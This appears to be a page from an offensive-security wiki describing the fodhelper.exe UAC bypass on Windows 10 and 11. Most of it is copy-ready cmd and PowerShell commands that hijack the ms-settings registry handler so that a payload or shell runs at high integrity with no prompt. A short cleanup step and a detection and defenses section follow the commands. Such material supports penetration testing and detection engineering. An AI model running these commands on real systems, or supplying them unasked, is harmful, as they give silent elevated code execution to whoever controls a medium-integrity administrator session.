# UAC Bypass via fodhelper

`fodhelper.exe` (Features on Demand helper) is a Microsoft-signed, **auto-elevating** binary that reads the `ms-settings` protocol handler from the current user's registry hive. Because `HKCU` is writable without elevation, a medium-integrity administrator can register a malicious `ms-settings\shell\open\command`, launch `fodhelper.exe`, and have their payload run at **high integrity with no UAC prompt**. It is the most widely used fileless UAC bypass and needs no dropped files.

## Requirements

- Member of local Administrators, running at **Medium** integrity (see [UAC Bypass](UAC-Bypass.md)).
- Windows 10 / 11 (fodhelper present since 1709).

## Exploitation

Register the hijack key and launch:

```cmd
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "cmd.exe /c C:\Windows\Temp\payload.exe" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f
fodhelper.exe
```

PowerShell one-liner equivalent (spawn an elevated PowerShell):

```powershell
New-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null
New-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "powershell -w hidden -c Start-Process cmd.exe -Verb runAs" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
```

Confirm the new shell is elevated:

```cmd
whoami /groups | findstr /i "High"
```

## Cleanup

```cmd
reg delete "HKCU\Software\Classes\ms-settings" /f
```

## Detection and defenses

- **Detection:** creation of `HKCU\Software\Classes\ms-settings\shell\open\command`, `fodhelper.exe` spawning `cmd`/`powershell` (Sysmon 12/13 + 1).
- **Defenses:** UAC "Always notify"; remove standing admin rights; alert on the key.

## Related
- [UAC Bypass](UAC-Bypass.md) — folder hub and the auto-elevate pattern
- [UAC Bypass via computerdefaults](UAC-Bypass-via-computerdefaults.md) — near-identical `ms-settings` sibling
- [UAC Bypass via eventvwr](UAC-Bypass-via-eventvwr.md) — the older `mscfile` variant
- [Registry Exploitation Techniques](../Registry-Exploitation/Registry-Exploitation-Techniques.md) — registry-hijack mechanics
